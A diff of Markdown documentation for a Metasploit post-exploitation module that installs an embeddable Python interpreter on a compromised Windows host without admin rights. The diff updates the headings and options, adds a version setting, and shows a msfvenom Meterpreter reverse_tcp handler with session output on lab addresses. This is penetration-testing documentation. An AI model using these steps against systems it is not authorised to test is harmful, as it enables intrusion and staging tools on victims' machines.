@@ -1,26 +1,32 @@
-This module downloads an embeddable Python3 interpreter onto the target file system, granting pentesters access to a lightweight Python interpreter. This module does not require administrative privileges or user interaction with installation prompts.
-### Creating A Testing Environment
+## Overview
 
-  This module has been tested against:
+This module downloads an embeddable Python3 distribution onto the target file system, granting pentesters access to a lightweight Python interpreter. This module does not require administrative privileges or user interaction with installation prompts.
+
+## Tested Version
+This module has been tested against:
 
 1. Windows 10, 1903
 
 ## Verification Steps
 
   1. Start msfconsole
-  2. Get a Meterpreter session running as a low privilege user
+  2. Get a Meterpreter session
   3. Do: `use post/windows/manage/install_python`
-  4. Do: `set session #`
-  5. Optional Do: `set PYTHON_URL`
-  6. Optional Do: `set FILE_PATH`
-  7. Do: `run`
+  4. Do: `set SESSION #`
+  5. Optional Do: `set PYTHON_VERSION`
+  6. Optional Do: `set PYTHON_URL`
+  7. Optional Do: `set FILE_PATH`
+  8. Do: `run`
 
 
 ## Options
+  **PYTHON_VERSION**
+
+  Specifies the Python version you would like to download. Downloads Python version 3.8.2 by default.
 
   **PYTHON_URL**
 
-  Specifies the URL used to download the Python embeddable zip file. Downloads Python version 3.8.2 by default.
+  Specifies the URL used to download the Python embeddable zip file.
 
   **FILE_PATH**
 
@@ -33,7 +39,7 @@ This module downloads an embeddable Python3 interpreter onto the target file sys
 
 ## Scenarios
 
-Get initial access: Create a Meterpreter exe using msfvenom, then transfer it to the target system via web server, SMB, etc. Execute the Meterpreter payload as a non-administrative user.
+Get initial access: Create a Meterpreter exe using msfvenom, then transfer it to the target system via web server, SMB, etc. Execute the payload to get a session.
 
     msf5 > handler -H 0.0.0.0 -P 4444 -p windows/meterpreter/reverse_tcp
     [*] Payload handler running as background job 0.
@@ -42,9 +48,6 @@ Get initial access: Create a Meterpreter exe using msfvenom, then transfer it to
     msf5 > 
     [*] Sending stage (180291 bytes) to 192.168.13.129
     [*] Meterpreter session 1 opened (192.168.13.130:4444 -> 192.168.13.129:50069) at 2020-03-04 20:32:59 -0500
-
-
-
 
 Use the post module to install Python on the target filesystem
 
